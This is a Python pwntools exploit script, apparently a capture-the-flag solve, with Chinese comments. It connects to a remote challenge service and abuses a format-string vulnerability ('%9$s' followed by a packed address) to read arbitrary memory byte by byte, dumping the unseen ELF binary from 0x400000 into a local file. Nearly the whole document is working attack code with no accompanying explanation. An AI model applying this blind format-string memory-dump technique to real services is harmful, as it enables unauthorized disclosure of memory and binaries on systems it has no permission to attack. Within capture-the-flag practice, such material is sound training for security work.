from pwn import *
import time

context.log_level = 'debug'   # 关键：打开看原始收发

p = remote("nc1.ctfplus.cn",48211)
p.recvuntil(b"You don't have the ELF, but you have a magic echo...\n")

BASE   = 0x400000
MARK   = b"\xde\xad\xbe\xef"   # 换成不常见的 4 字节
OFFSET = 9

def leak(addr):
    payload = b"%" + str(OFFSET).encode() + b"$s" + MARK + p64(addr)
    p.sendline(payload)

    buf = b''
    t0 = time.time()
    while MARK not in buf:
        if time.time() - t0 > 5:
            log.warning("TIMEOUT at 0x%x, got %d bytes" % (addr, len(buf)))
            log.warning("partial: %r" % buf[:64])
            return None
        try:
            chunk = p.recv(4096, timeout=1)
        except EOFError:
            log.warning("EOF at 0x%x" % addr)
            return None
        if not chunk:
            continue
        buf += chunk

    idx = buf.find(MARK)
    data = buf[:idx]
    leftover = buf[idx+len(MARK):]

    # 消费掉 printf 把地址字节当字面量打印出来的部分
    tail = p64(addr).split(b'\x00')[0]
    need = len(tail) - len(leftover)
    if need > 0:
        try:
            p.recvn(need, timeout=1)
        except EOFError:
            pass

    return data

bin_data = b''
begin = BASE

try:
    while True:
        data = leak(begin)
        if data is None:
            break
        if len(data) == 0:
            bin_data += b'\x00'
            begin += 1
        else:
            bin_data += data
            begin += len(data)
        if len(bin_data) % 0x100 == 0:
            log.info("dumped 0x%x, cur=0x%x" % (len(bin_data), begin))
except KeyboardInterrupt:
    pass
finally:
    log.success("total: 0x%x" % len(bin_data))
    open('dump_bin', 'wb').write(bin_data)
    p.close()